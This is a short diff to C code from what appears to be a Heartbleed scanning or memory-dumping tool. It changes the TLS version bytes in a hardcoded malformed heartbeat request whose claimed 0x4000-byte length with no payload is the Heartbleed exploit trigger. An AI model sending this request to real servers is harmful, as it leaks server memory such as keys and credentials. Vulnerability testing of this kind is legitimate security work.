@@ -1716,7 +1716,7 @@ ssl_thread_raw(int fd, const struct DumpArgs *args, struct Target *target,
      */
     rec.heartbleed.state = 0;
 //resend:
-    x = send(fd, "\x18\x03\x03\x00\x03"
+    x = send(fd, "\x18\x03\x01\x00\x03"
                  "\x01\x40\x00", 8, MSG_NOSIGNAL);
     if (x < 3) {
         ERROR_MSG("[-] raw handshake: %s (%u)\n",
